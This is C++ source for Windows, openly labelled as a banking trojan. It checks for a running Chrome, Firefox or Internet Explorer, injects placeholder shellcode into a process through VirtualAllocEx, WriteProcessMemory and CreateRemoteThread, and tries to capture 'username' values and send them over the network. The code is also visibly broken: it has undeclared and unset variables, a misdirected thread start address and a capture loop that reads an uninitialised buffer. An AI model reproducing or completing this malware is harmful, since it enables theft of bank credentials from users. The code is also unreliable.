#include <iostream>
#include <fstream>
#include <windows.h>
#include <tlhelp32.h>

#define BUFFER_SIZE 1024

const char* c2Server = "http://your_c2_server.com";
const char* bankingURL = "https://example-banking-site.com";

char shellcode[] = "\x90\x90\x90..."; // Replace with your actual shellcode
HANDLE hProcess;
DWORD processID;

// Function to check if the active window title or process list contains a browser
bool isBrowserActive() {
    char buffer[BUFFER_SIZE];
    GetWindowText(GetForegroundWindow(), buffer, BUFFER_SIZE);

    for (char* ptr = &buffer[0]; *ptr; ++ptr) {
        if (_stricmp(ptr, "Chrome") == 0 || _stricmp(ptr, "Firefox") == 0 || _stricmp(ptr, "Internet Explorer") == 0) return true;
    }

    PROCESSENTRY32 pe32 = { 0 };
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap != INVALID_HANDLE_VALUE) {
        pe32.dwSize = sizeof(PROCESSENTRY32);

        if (Process32First(hProcessSnap, &pe32)) {
            do {
                if (_stricmp(pe32.szExeFile, "chrome.exe") == 0 || _stricmp(pe32.szExeFile, "firefox.exe") == 0 || _stricmp(pe32.szExeFile, "iexplore.exe") == 0) return true;
            } while (Process32Next(hProcessSnap, &pe32));
        }
    }

    CloseHandle(hProcessSnap);
    return false;
}

// Function to inject shellcode into the browser process
void injectShellcode() {
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, processID);

    if (!hProcess) return;

    VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(hProcess, (LPVOID)VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_READWRITE), shellcode, sizeof(shellcode), &written);

    CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)(void*)shellcode, NULL, 0, NULL);
}

// Function to capture and exfiltrate credentials
void captureAndExfiltrate() {
    HINTERNET hInternet = InternetOpen("Banking Trojan", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

    if (hInternet) {
        HINTERNET hUrl = InternetOpenUrl(hInternet, bankingURL, NULL, 0, 0, 0);

        if (hUrl) {
            char buffer[BUFFER_SIZE];
            DWORD bytesWritten;

            // Monitor and capture POST data
            for (char* ptr = &buffer[0]; *ptr; ++ptr) {
                if (*ptr == 'u' && *(ptr+1) == 's' && *(ptr+2) == 'e' && *(ptr+3) == 'r') { // Search for "username="
                    while (*ptr != '&') ++ptr;
                    memcpy(buffer, ptr + 1, strlen(ptr + 1));
                    InternetWriteFile(hUrl, buffer, strlen(buffer), &bytesWritten);
                }
            }

            InternetCloseHandle(hUrl);
        }

        InternetCloseHandle(hInternet);
    }
}

int main() {
    while (true) {
        if (isBrowserActive()) {
            injectShellcode();
            captureAndExfiltrate();
        }

        Sleep(1000); // Poll every 1 second
    }

    return 0;
}